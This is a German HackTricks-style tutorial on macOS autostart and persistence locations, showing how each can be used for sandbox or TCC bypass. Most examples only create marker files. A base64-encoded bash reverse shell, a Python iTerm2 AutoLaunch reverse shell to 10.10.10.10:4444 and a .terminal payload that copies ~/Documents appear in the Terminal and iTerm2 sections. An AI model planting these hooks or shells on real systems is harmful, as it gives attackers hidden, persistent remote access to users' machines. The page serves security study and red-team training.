# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Dieser Abschnitt basiert stark auf der Blog-Serie [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Das Ziel ist es, **mehr Autostart-Standorte** hinzuzufügen (wenn möglich), anzugeben, **welche Techniken heutzutage** mit der neuesten Version von macOS (13.4) **noch funktionieren** und die **erforderlichen Berechtigungen** zu spezifizieren.

## Sandbox Bypass

> [!TIP]
> Hier finden Sie Startorte, die nützlich für den **Sandbox-Bypass** sind, der es Ihnen ermöglicht, einfach etwas auszuführen, indem Sie es **in eine Datei schreiben** und **warten** auf eine sehr **häufige** **Aktion**, eine bestimmte **Zeitspanne** oder eine **Aktion, die Sie normalerweise** innerhalb einer Sandbox ohne Root-Berechtigungen ausführen können.

### Launchd

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Standorte

- **`/Library/LaunchAgents`**
- **Trigger**: Neustart
- Root erforderlich
- **`/Library/LaunchDaemons`**
- **Trigger**: Neustart
- Root erforderlich
- **`/System/Library/LaunchAgents`**
- **Trigger**: Neustart
- Root erforderlich
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Neustart
- Root erforderlich
- **`~/Library/LaunchAgents`**
- **Trigger**: Neu anmelden
- **`~/Library/LaunchDemons`**
- **Trigger**: Neu anmelden

> [!TIP]
> Als interessantes Faktum hat **`launchd`** eine eingebettete Property-Liste im Mach-o-Bereich `__Text.__config`, die andere bekannte Dienste enthält, die launchd starten muss. Darüber hinaus können diese Dienste `RequireSuccess`, `RequireRun` und `RebootOnSuccess` enthalten, was bedeutet, dass sie ausgeführt und erfolgreich abgeschlossen werden müssen.
>
> Natürlich kann es aufgrund der Code-Signierung nicht geändert werden.

#### Beschreibung & Ausnutzung

**`launchd`** ist der **erste** **Prozess**, der vom OX S-Kernel beim Start ausgeführt wird, und der letzte, der beim Herunterfahren beendet wird. Es sollte immer die **PID 1** haben. Dieser Prozess wird die Konfigurationen lesen und ausführen, die in den **ASEP** **plists** in:

- `/Library/LaunchAgents`: Pro-Benutzer-Agenten, die vom Administrator installiert wurden
- `/Library/LaunchDaemons`: Systemweite Daemons, die vom Administrator installiert wurden
- `/System/Library/LaunchAgents`: Pro-Benutzer-Agenten, die von Apple bereitgestellt werden.
- `/System/Library/LaunchDaemons`: Systemweite Daemons, die von Apple bereitgestellt werden.

Wenn sich ein Benutzer anmeldet, werden die Plists, die sich in `/Users/$USER/Library/LaunchAgents` und `/Users/$USER/Library/LaunchDemons` befinden, mit den **Berechtigungen des angemeldeten Benutzers** gestartet.

Der **Hauptunterschied zwischen Agenten und Daemons besteht darin, dass Agenten geladen werden, wenn sich der Benutzer anmeldet, und die Daemons beim Systemstart geladen werden** (da es Dienste wie ssh gibt, die ausgeführt werden müssen, bevor ein Benutzer auf das System zugreift). Außerdem können Agenten eine GUI verwenden, während Daemons im Hintergrund ausgeführt werden müssen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Es gibt Fälle, in denen ein **Agent vor der Benutzeranmeldung ausgeführt werden muss**, diese werden **PreLoginAgents** genannt. Zum Beispiel ist dies nützlich, um unterstützende Technologien bei der Anmeldung bereitzustellen. Sie sind auch in `/Library/LaunchAgents` zu finden (siehe [**hier**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ein Beispiel).

> [!NOTE]
> Neue Daemons oder Agenten-Konfigurationsdateien werden **nach dem nächsten Neustart oder mit** `launchctl load <target.plist>` **geladen**. Es ist **auch möglich, .plist-Dateien ohne diese Erweiterung** mit `launchctl -F <file>` **zu laden** (jedoch werden diese plist-Dateien nach dem Neustart nicht automatisch geladen).\
> Es ist auch möglich, mit `launchctl unload <target.plist>` **zu entladen** (der Prozess, auf den verwiesen wird, wird beendet),
>
> Um **sicherzustellen**, dass es **nichts** (wie eine Überschreibung) gibt, das **verhindert**, dass ein **Agent** oder **Daemon** **ausgeführt wird**, führen Sie aus: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Listen Sie alle von dem aktuellen Benutzer geladenen Agenten und Daemons auf:
```bash
launchctl list
```
> [!WARNING]
> Wenn eine plist einem Benutzer gehört, wird die **Aufgabe als Benutzer** und nicht als root ausgeführt, selbst wenn sie sich in einem systemweiten Daemon-Ordner befindet. Dies kann einige Privilegieneskalationsangriffe verhindern.

#### Weitere Informationen zu launchd

**`launchd`** ist der **erste** Benutzerprozess, der vom **Kernel** gestartet wird. Der Prozessstart muss **erfolgreich** sein und er **darf nicht beendet oder abstürzen**. Er ist sogar gegen einige **Kill-Signale** **geschützt**.

Eine der ersten Aufgaben von `launchd` ist es, alle **Daemons** zu **starten**, wie:

- **Timer-Daemons**, die basierend auf der Zeit ausgeführt werden:
- atd (`com.apple.atrun.plist`): Hat ein `StartInterval` von 30 Minuten
- crond (`com.apple.systemstats.daily.plist`): Hat `StartCalendarInterval`, um um 00:15 zu starten
- **Netzwerk-Daemons** wie:
- `org.cups.cups-lpd`: Lauscht in TCP (`SockType: stream`) mit `SockServiceName: printer`
- SockServiceName muss entweder ein Port oder ein Dienst aus `/etc/services` sein
- `com.apple.xscertd.plist`: Lauscht in TCP auf Port 1640
- **Pfad-Daemons**, die ausgeführt werden, wenn sich ein bestimmter Pfad ändert:
- `com.apple.postfix.master`: Überprüft den Pfad `/etc/postfix/aliases`
- **IOKit-Benachrichtigungs-Daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach-Port:**
- `com.apple.xscertd-helper.plist`: Es zeigt im `MachServices`-Eintrag den Namen `com.apple.xscertd.helper`
- **UserEventAgent:**
- Dies unterscheidet sich von dem vorherigen. Es lässt launchd Apps als Reaktion auf spezifische Ereignisse starten. In diesem Fall ist das Haupt-Binärprogramm jedoch nicht `launchd`, sondern `/usr/libexec/UserEventAgent`. Es lädt Plugins aus dem SIP-eingeschränkten Ordner /System/Library/UserEventPlugins/, wo jedes Plugin seinen Initialisierer im `XPCEventModuleInitializer`-Schlüssel oder im Fall älterer Plugins im `CFPluginFactories`-Dict unter dem Schlüssel `FB86416D-6164-2070-726F-70735C216EC0` seiner `Info.plist` angibt.

### Shell-Startdateien

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- Aber Sie müssen eine App mit einer TCC-Umgehung finden, die eine Shell ausführt, die diese Dateien lädt

#### Standorte

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Öffnen Sie ein Terminal mit zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Öffnen Sie ein Terminal mit zsh
- Root erforderlich
- **`~/.zlogout`**
- **Trigger**: Beenden Sie ein Terminal mit zsh
- **`/etc/zlogout`**
- **Trigger**: Beenden Sie ein Terminal mit zsh
- Root erforderlich
- Potenziell mehr in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Öffnen Sie ein Terminal mit bash
- `/etc/profile` (funktionierte nicht)
- `~/.profile` (funktionierte nicht)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Erwartet, dass es mit xterm ausgelöst wird, aber es **ist nicht installiert** und selbst nach der Installation wird dieser Fehler angezeigt: xterm: `DISPLAY is not set`

#### Beschreibung & Ausnutzung

Beim Starten einer Shell-Umgebung wie `zsh` oder `bash` werden **bestimmte Startdateien ausgeführt**. macOS verwendet derzeit `/bin/zsh` als Standard-Shell. Diese Shell wird automatisch aufgerufen, wenn die Terminal-Anwendung gestartet wird oder wenn ein Gerät über SSH zugegriffen wird. Während `bash` und `sh` ebenfalls in macOS vorhanden sind, müssen sie ausdrücklich aufgerufen werden, um verwendet zu werden.

Die Man-Seite von zsh, die wir mit **`man zsh`** lesen können, hat eine lange Beschreibung der Startdateien.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Wiedereröffnete Anwendungen

> [!VORSICHT]
> Die Konfiguration der angegebenen Ausnutzung und das Abmelden und Anmelden oder sogar Neustarten haben bei mir nicht funktioniert, um die App auszuführen. (Die App wurde nicht ausgeführt, vielleicht muss sie laufen, wenn diese Aktionen durchgeführt werden)

**Schriftliche Zusammenfassung**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Auslöser**: Neustart von wiedereröffnenden Anwendungen

#### Beschreibung & Ausnutzung

Alle Anwendungen, die wiedereröffnet werden sollen, befinden sich in der plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Um die wiedereröffnenden Anwendungen dazu zu bringen, Ihre eigene zu starten, müssen Sie einfach **Ihre App zur Liste hinzufügen**.

Die UUID kann durch Auflisten dieses Verzeichnisses oder mit `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` gefunden werden.

Um die Anwendungen zu überprüfen, die wiedereröffnet werden, können Sie Folgendes tun:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Um **eine Anwendung zu dieser Liste hinzuzufügen**, können Sie Folgendes verwenden:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal-Einstellungen

- Nützlich, um Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- Terminal verwendet die FDA-Berechtigungen des Benutzers, der es verwendet

#### Standort

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Terminal öffnen

#### Beschreibung & Ausnutzung

In **`~/Library/Preferences`** werden die Einstellungen des Benutzers in den Anwendungen gespeichert. Einige dieser Einstellungen können eine Konfiguration enthalten, um **andere Anwendungen/Skripte auszuführen**.

Zum Beispiel kann das Terminal einen Befehl beim Start ausführen:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Diese Konfiguration spiegelt sich in der Datei **`~/Library/Preferences/com.apple.Terminal.plist`** wie folgt wider:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Wenn die plist der Einstellungen des Terminals im System überschrieben werden könnte, kann die **`open`**-Funktionalität verwendet werden, um **das Terminal zu öffnen und dieser Befehl wird ausgeführt**.

Sie können dies über die CLI hinzufügen mit:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal-Skripte / Andere Dateiendungen

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- Terminal verwendet, um FDA-Berechtigungen des Benutzers zu nutzen

#### Standort

- **Überall**
- **Auslöser**: Terminal öffnen

#### Beschreibung & Ausnutzung

Wenn Sie ein [**`.terminal`**-Skript](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) erstellen und öffnen, wird die **Terminal-Anwendung** automatisch aufgerufen, um die dort angegebenen Befehle auszuführen. Wenn die Terminal-App über besondere Berechtigungen verfügt (wie TCC), wird Ihr Befehl mit diesen besonderen Berechtigungen ausgeführt.

Versuchen Sie es mit:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Sie können auch die Erweiterungen **`.command`**, **`.tool`** verwenden, mit regulären Shell-Skript-Inhalten, und sie werden ebenfalls von Terminal geöffnet.

> [!CAUTION]
> Wenn das Terminal **Vollzugriff auf die Festplatte** hat, kann es diese Aktion ausführen (beachten Sie, dass der ausgeführte Befehl in einem Terminalfenster sichtbar sein wird).

### Audio-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
- Sie könnten zusätzlichen TCC-Zugriff erhalten

#### Standort

- **`/Library/Audio/Plug-Ins/HAL`**
- Root erforderlich
- **Trigger**: Coreaudiod oder den Computer neu starten
- **`/Library/Audio/Plug-ins/Components`**
- Root erforderlich
- **Trigger**: Coreaudiod oder den Computer neu starten
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: Coreaudiod oder den Computer neu starten
- **`/System/Library/Components`**
- Root erforderlich
- **Trigger**: Coreaudiod oder den Computer neu starten

#### Beschreibung

Laut den vorherigen Writeups ist es möglich, **einige Audio-Plugins zu kompilieren** und sie zu laden.

### QuickLook-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🟠](https://emojipedia.org/large-orange-circle)
- Sie könnten zusätzlichen TCC-Zugriff erhalten

#### Standort

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beschreibung & Ausnutzung

QuickLook-Plugins können ausgeführt werden, wenn Sie **die Vorschau einer Datei auslösen** (drücken Sie die Leertaste, während die Datei im Finder ausgewählt ist) und ein **Plugin, das diesen Dateityp unterstützt**, installiert ist.

Es ist möglich, Ihr eigenes QuickLook-Plugin zu kompilieren, es an einem der vorherigen Standorte zu platzieren, um es zu laden, und dann zu einer unterstützten Datei zu gehen und die Leertaste zu drücken, um es auszulösen.

### ~~Login/Logout-Hooks~~

> [!CAUTION]
> Das hat bei mir nicht funktioniert, weder mit dem Benutzer-LoginHook noch mit dem Root-LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- Sie müssen in der Lage sein, etwas wie `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` auszuführen
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Sie sind veraltet, können aber verwendet werden, um Befehle auszuführen, wenn sich ein Benutzer anmeldet.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Diese Einstellung wird in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` gespeichert.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Um es zu löschen:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Der Root-Benutzer wird in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** gespeichert.

## Bedingte Sandbox-Umgehung

> [!TIP]
> Hier finden Sie Startorte, die nützlich für die **Sandbox-Umgehung** sind, die es Ihnen ermöglicht, etwas einfach auszuführen, indem Sie es **in eine Datei schreiben** und **nicht sehr häufige Bedingungen** wie spezifische **installierte Programme, "ungewöhnliche" Benutzer**aktionen oder Umgebungen erwarten.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Nützlich zur Umgehung der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- Sie müssen jedoch in der Lage sein, die `crontab`-Binärdatei auszuführen
- Oder Root sein
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root erforderlich für direkten Schreibzugriff. Kein Root erforderlich, wenn Sie `crontab <file>` ausführen können
- **Trigger**: Hängt vom Cron-Job ab

#### Beschreibung & Ausnutzung

Listen Sie die Cron-Jobs des **aktuellen Benutzers** mit auf:
```bash
crontab -l
```
Sie können auch alle Cron-Jobs der Benutzer in **`/usr/lib/cron/tabs/`** und **`/var/at/tabs/`** (benötigt Root) einsehen.

In MacOS finden sich mehrere Ordner, die Skripte mit **bestimmter Häufigkeit** ausführen:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Dort finden Sie die regulären **cron** **Jobs**, die **at** **Jobs** (nicht sehr häufig verwendet) und die **periodischen** **Jobs** (hauptsächlich zum Reinigen temporärer Dateien verwendet). Die täglichen periodischen Jobs können beispielsweise mit: `periodic daily` ausgeführt werden.

Um programmgesteuert einen **Benutzer-Cronjob** hinzuzufügen, ist es möglich, Folgendes zu verwenden:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Nützlich zum Umgehen des Sandboxes: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 hatte früher gewährte TCC-Berechtigungen

#### Standorte

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: iTerm öffnen
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: iTerm öffnen
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: iTerm öffnen

#### Beschreibung & Ausnutzung

In **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gespeicherte Skripte werden ausgeführt. Zum Beispiel:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
oder:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Das Skript **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** wird ebenfalls ausgeführt:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-Einstellungen, die sich in **`~/Library/Preferences/com.googlecode.iterm2.plist`** befinden, können **einen auszuführenden Befehl angeben**, wenn das iTerm2-Terminal geöffnet wird.

Diese Einstellung kann in den iTerm2-Einstellungen konfiguriert werden:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Und der Befehl wird in den Einstellungen angezeigt:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Sie können den auszuführenden Befehl mit folgendem festlegen:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Es ist sehr wahrscheinlich, dass es **andere Möglichkeiten gibt, die iTerm2-Einstellungen zu missbrauchen**, um beliebige Befehle auszuführen.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber xbar muss installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- Es werden Zugriffsberechtigungen angefordert

#### Standort

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Sobald xbar ausgeführt wird

#### Beschreibung

Wenn das beliebte Programm [**xbar**](https://github.com/matryer/xbar) installiert ist, ist es möglich, ein Shell-Skript in **`~/Library/Application\ Support/xbar/plugins/`** zu schreiben, das ausgeführt wird, wenn xbar gestartet wird:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber Hammerspoon muss installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Zugriffsberechtigungen an

#### Location

- **`~/.hammerspoon/init.lua`**
- **Trigger**: Sobald Hammerspoon ausgeführt wird

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dient als Automatisierungsplattform für **macOS** und nutzt die **LUA-Skriptsprache** für seine Operationen. Bemerkenswert ist, dass es die Integration von vollständigem AppleScript-Code und die Ausführung von Shell-Skripten unterstützt, was seine Skriptingfähigkeiten erheblich verbessert.

Die App sucht nach einer einzelnen Datei, `~/.hammerspoon/init.lua`, und beim Start wird das Skript ausgeführt.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber BetterTouchTool muss installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- Es werden Berechtigungen für Automatisierung-Shortcuts und Barrierefreiheit angefordert

#### Standort

- `~/Library/Application Support/BetterTouchTool/*`

Dieses Tool ermöglicht es, Anwendungen oder Skripte anzugeben, die ausgeführt werden sollen, wenn bestimmte Shortcuts gedrückt werden. Ein Angreifer könnte in der Lage sein, seinen eigenen **Shortcut und die Aktion, die in der Datenbank ausgeführt werden soll**, zu konfigurieren, um beliebigen Code auszuführen (ein Shortcut könnte einfach das Drücken einer Taste sein).

### Alfred

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber Alfred muss installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- Es werden Berechtigungen für Automatisierung, Barrierefreiheit und sogar Vollzugriff auf die Festplatte angefordert

#### Standort

- `???`

Es ermöglicht die Erstellung von Workflows, die Code ausführen können, wenn bestimmte Bedingungen erfüllt sind. Potenziell ist es möglich, dass ein Angreifer eine Workflow-Datei erstellt und Alfred dazu bringt, sie zu laden (es ist erforderlich, die Premium-Version zu bezahlen, um Workflows zu verwenden).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber SSH muss aktiviert und verwendet werden
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
- SSH benötigt FDA-Zugriff

#### Standort

- **`~/.ssh/rc`**
- **Trigger**: Anmeldung über SSH
- **`/etc/ssh/sshrc`**
- Root erforderlich
- **Trigger**: Anmeldung über SSH

> [!CAUTION]
> Um SSH zu aktivieren, ist Vollzugriff auf die Festplatte erforderlich:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Beschreibung & Ausnutzung

Standardmäßig, es sei denn, `PermitUserRC no` in `/etc/ssh/sshd_config`, werden die Skripte **`/etc/ssh/sshrc`** und **`~/.ssh/rc`** ausgeführt, wenn sich ein Benutzer **über SSH anmeldet**.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber Sie müssen `osascript` mit Argumenten ausführen
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Standorte

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Anmeldung
- Exploit-Payload wird durch Aufruf von **`osascript`** gespeichert
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Anmeldung
- Root erforderlich

#### Beschreibung

In den Systemeinstellungen -> Benutzer & Gruppen -> **Anmeldeobjekte** finden Sie **Objekte, die ausgeführt werden sollen, wenn der Benutzer sich anmeldet**.\
Es ist möglich, sie aufzulisten, hinzuzufügen und über die Befehlszeile zu entfernen:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Diese Elemente werden in der Datei **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** gespeichert.

**Anmeldeelemente** können **auch** über die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) angezeigt werden, die die Konfiguration in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** speichert.

### ZIP als Anmeldeelement

(Siehe vorherigen Abschnitt über Anmeldeelemente, dies ist eine Erweiterung)

